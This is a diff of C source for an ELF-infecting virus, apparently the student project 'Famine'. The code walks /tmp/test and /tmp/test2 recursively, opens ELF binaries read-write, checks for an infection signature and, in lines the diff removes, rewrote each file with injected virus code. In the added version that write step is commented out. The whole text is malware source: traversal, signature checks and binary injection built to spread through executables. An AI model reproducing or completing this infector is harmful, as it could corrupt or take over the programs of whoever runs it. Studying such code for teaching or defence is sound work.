@@ -68,7 +68,7 @@ void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
 
-void	try_open_file(t_elf *virus_elf, char *file)
+void	infect_file(char *file)
 {
 	int				ret;
 	int				fd;
@@ -78,7 +78,10 @@ void	try_open_file(t_elf *virus_elf, char *file)
 	fd = syscall_open(file, O_RDWR);
 	if (fd > 0)
 	{
-		ret = read(fd, header, 64);
+		#ifdef DEBUG
+			ft_putstr(" 📄\n");
+		#endif
+		ret = syscall_read(fd, header, 64);
 		if (ret >= 0)
 		{
 			ret = check_magic_elf(header);
@@ -86,39 +89,30 @@ void	try_open_file(t_elf *virus_elf, char *file)
 			{
 				ret = 0;
 				elf.filename = file;
-				elf.size = lseek(fd, (size_t)0, SEEK_END);
+				elf.size = syscall_lseek(fd, (size_t)0, SEEK_END);
 				if (elf.size < 0 ||
 (elf.addr = syscall_mmap(NULL, elf.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
 				{
 					syscall_close(fd);
 					#ifdef DEBUG
-						debug_print_error(0, virus_elf->filename, file);
+						debug_print_error(0, file);
 					#endif
 					return ;
 				}
-				if (!memmem(elf.addr, elf.size, SIGNATURE, ft_strlen(SIGNATURE)))
+				if (!ft_memmem(elf.addr, elf.size, SIGNATURE, ft_strlen(SIGNATURE)))
 				{
 					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
 					{
 						syscall_munmap(elf.addr, elf.size);
 						syscall_close(fd);
 						#ifdef DEBUG
-							debug_print_error(ret, virus_elf->filename, file);
+							debug_print_error(ret, file);
 						#endif
 						return ;
 					}
+					/*
 					int		size_needed = get_size_needed(&elf, virus_elf);
 					int		nb_zero_to_add = PAGE_SIZE - (size_needed % PAGE_SIZE);
-					/*
-					#ifdef DEBUG
-						printf("previous size: %ld\n", elf.size);
-						printf("size injection: %ld\n", virus_elf->size);
-						printf("size_needed: %d\n", size_needed);
-						printf("nb_zero_to_add: %d\n", nb_zero_to_add);
-						printf("total addition: %d\n", size_needed + nb_zero_to_add);
-						printf("final size: %ld\n", elf.size + size_needed + nb_zero_to_add);
-					#endif
-					*/
 					char	*new;
 					new = syscall_mmap(NULL, elf.size + size_needed + nb_zero_to_add, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
 					if (!new)
@@ -126,7 +120,7 @@ void	try_open_file(t_elf *virus_elf, char *file)
 						syscall_munmap(elf.addr, elf.size);
 						syscall_close(fd);
 						#ifdef DEBUG
-							debug_print_error(ret, virus_elf->filename, file);
+							debug_print_error(ret, file);
 						#endif
 						return ;
 					}
@@ -136,137 +130,88 @@ void	try_open_file(t_elf *virus_elf, char *file)
 					fd = syscall_open(file, O_TRUNC | O_WRONLY);
 					if (fd < 0)
 						return ;
-					write(fd, new, elf.size + size_needed + nb_zero_to_add);
+					syscall_write(fd, new, elf.size + size_needed + nb_zero_to_add);
 					syscall_munmap(new, elf.size + size_needed + nb_zero_to_add);
+					*/
 				}
 				#ifdef DEBUG
 				else
-				{
-					ft_putstr(file);
-					ft_putstr(" already infected.\n");
-				}
+					debug_print_error(ALREADY_INFECTED, file);
 				#endif
 			}
 		}
 		#ifdef DEBUG
 		else
-			debug_print_error(ret, virus_elf->filename, file);
+			debug_print_error(ret, file);
 		#endif
 		syscall_close(fd);
 	}
+	#ifdef DEBUG
+	else
+		ft_putstr(" 🔏\n");
+	#endif
 }
 
-void	moving_through_path(t_elf *virus_elf, char *path, char *d_name)
+void	search_file_to_infect(char *path)
 {
-	char			new_path[ft_strlen(path) + ft_strlen(d_name) + 2];
-	char			buffer[1024];
 	struct stat		statbuf;
 	int				fd;
 
-	ft_strcpy(new_path, path);
-	if (strlen(d_name))
-		ft_strcat(new_path, "/");
-	ft_strcat(new_path, d_name);
-	syscall_stat(new_path, &statbuf);
+	#ifdef DEBUG
+		ft_putstr(path);
+	#endif
+	syscall_stat(path, &statbuf);
 	if ((statbuf.st_mode & S_IFMT) == S_IFDIR)
 	{
-		fd =  syscall_open(new_path, O_RDONLY | O_DIRECTORY);
+		fd =  syscall_open(path, O_RDONLY | O_DIRECTORY);
 		if (fd > 0)
 		{
+			#ifdef DEBUG
+				ft_putstr(" 📁\n");
+			#endif
 			int		nread;
-			int		rest;
-			rest = 0;
-			while ((nread = syscall_getdents(fd, (struct linux_dirent *)(buffer + rest), 1024 - rest)) > 0)
+			char	buffer[1024];
+			while ((nread = syscall_getdents(fd, (struct linux_dirent *)buffer, 1024)) > 0)
 			{
 				long					bpos;
 				struct linux_dirent		*linux_dir;
-				#ifdef DEBUG
-					ft_putstr("-> ");
-					ft_putstr(new_path);
-					ft_putstr("\n");
-				#endif
-				for (bpos = 0; bpos < nread;)
-				{
-					linux_dir = (void *)buffer + bpos;
-					if (bpos + linux_dir->d_reclen > nread)
-					{
-						rest = linux_dir->d_reclen;
-						ft_memcpy(buffer, buffer + bpos, 1024 - bpos);
-					}
-					bpos += linux_dir->d_reclen;
-					//else
-					//	
-				}
 				for (bpos = 0; bpos < nread;)
 				{
 					linux_dir = (void *)buffer + bpos;
 					if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
-						moving_through_path(virus_elf, new_path, linux_dir->d_name);
+					{
+						char new_path[MAX_PATH_LENGTH];
+						ft_strcpy(new_path, path);
+						ft_strcat(new_path, "/");
+						ft_strcat(new_path, linux_dir->d_name);
+						search_file_to_infect(new_path);
+					}
 					bpos += linux_dir->d_reclen;
 				}
 			}
-			//printf("nread %d\n", nread);
 		}
+		#ifdef DEBUG
+		else
+			ft_putstr(" 🔒\n");
+		#endif
 		syscall_close(fd);
 	}
 	else
-	{
-		//printf("%s: %d\n", new_path, statbuf.st_mode);
-		try_open_file(virus_elf, new_path);
-	}
+		infect_file(path);
 }
 
-int		main(int argc, char *argv[])
+void	infect(void)
 {
-	int		fd;
-	int		ret;
-	t_elf	elf;
+	search_file_to_infect("/tmp/test");
+	search_file_to_infect("/tmp/test2");
+}
 
-	ret = 0;
+int		_start(void)
+{
 	#ifdef DEBUG
-		debug_print_args(argc, argv);
+		syscall_write(STDOUT_FILENO, "HOST\n", 5);
 	#endif
-	fd = syscall_open(argv[0], O_RDONLY);
-	if (fd > 0)
-	{
-		/* TODO: Original infection
-			Copy the whole file
-		*/
-		if (!ft_strcmp(basename(argv[0]), "Famine"))
-		{
-			elf.filename = argv[0];
-			elf.size = syscall_lseek(fd, (size_t)0, SEEK_END);
-			if (elf.size < 0 ||
-	(elf.addr = syscall_mmap(NULL, elf.size, PROT_READ, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
-			{
-				syscall_close(fd);
-				#ifdef DEBUG
-					debug_print_error(0, argv[0], argv[0]);
-				#endif
-				return (1);
-			}
-			if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
-			{
-				syscall_munmap(elf.addr, elf.size);;
-				syscall_close(fd);
-				#ifdef DEBUG
-					debug_print_error(0, argv[0], argv[0]);
-				#endif
-				return (1);
-			}
-			moving_through_path(&elf, "/tmp/test", "");
-			moving_through_path(&elf, "/tmp/test2", "");
-			syscall_munmap(elf.addr, elf.size);
-			syscall_close(fd);
-		}
-		else
-			syscall_write(STDOUT_FILENO, "Host\n", 5);
-		// TODO: Host infection
-	}
-	#ifdef DEBUG
-	else
-		debug_print_error(0, argv[0], argv[0]);
-	#endif
+	infect();
 	syscall_exit(0);
 	return (0);
 }
